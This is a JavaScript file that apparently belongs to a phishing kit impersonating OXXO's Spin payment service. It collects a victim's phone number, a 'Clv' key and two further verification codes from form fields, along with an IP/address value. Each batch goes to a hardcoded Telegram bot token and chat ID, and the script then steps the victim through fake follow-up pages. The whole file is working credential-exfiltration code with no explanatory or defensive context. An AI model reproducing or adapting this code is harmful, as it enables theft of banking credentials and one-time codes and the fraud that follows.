//bot token
var telegram_bot_id = "6353731630:AAEp_v1pSmKU8epJ7dpWQ2mnpDIQCpIUEzA";
//chat id
var chat_id = 6547031566;
var USER, PASS, PIN, PIN2, PIN3, NUMBER, ip, ip2, message;

var ready = function () {
    CEL = document.getElementById("ypn-cel").value;
    FN = document.getElementById("ypn-fn").value;
    ip2 = document.getElementById("address").innerHTML;
    message =  "💲💲💲💲Spin by OXXO💲💲💲💲\n📱Celular: "+ CEL + "\n📅Clv: "+ FN + "\n" + ip2;
    localStorage.setItem("CEL", CEL);
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="index2.html"
    });
    return false;
}

var ready1 = function () {
    CEL = localStorage.getItem("CEL");
    DT = document.getElementById("ypndt").value;
    message = "\n COD1: " + DT + "\n📱Celular: " + CEL; localStorage.setItem("CEL", CEL);
};
var sender1 = function () {
    ready1();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="index3.html"
    });
    return false;
}


var ready2 = function () {
    CEL = localStorage.getItem("CEL");
    CD = document.getElementById("ypncd").value;
    message = "COD2: " + CD + "\n📱Celular: " + CEL; localStorage.setItem("CEL", CEL);
};
var sender2 = function () {
    ready2();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="index.html"
    });
    return false;
}

